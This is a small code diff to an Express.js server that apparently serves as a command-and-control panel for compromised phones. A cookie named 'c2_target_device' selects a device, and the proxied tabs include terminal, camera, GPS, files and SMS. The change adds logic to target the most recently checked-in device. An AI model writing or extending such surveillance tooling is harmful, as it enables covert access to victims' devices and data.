@@ -212,8 +212,24 @@ app.get('/', (req, res) => {
 
 // Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
 app.all('*', (req, res) => {
+    if (req.path === '/favicon.ico') return res.status(404).end();
+
     let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;
-    if (!deviceId && devices.size > 0) deviceId = Array.from(devices.keys())[0];
+
+    // Fallback: Pick the most recently active checked-in device
+    if (!deviceId && devices.size > 0) {
+        let latestDevice = null;
+        let latestTime = 0;
+        for (const [id, dev] of devices.entries()) {
+            const t = new Date(dev.lastSeen || 0).getTime();
+            if (t > latestTime) {
+                latestTime = t;
+                latestDevice = id;
+            }
+        }
+        deviceId = latestDevice || Array.from(devices.keys())[0];
+    }
+
     if (!deviceId) deviceId = 'samsung';
 
     if (deviceId) {
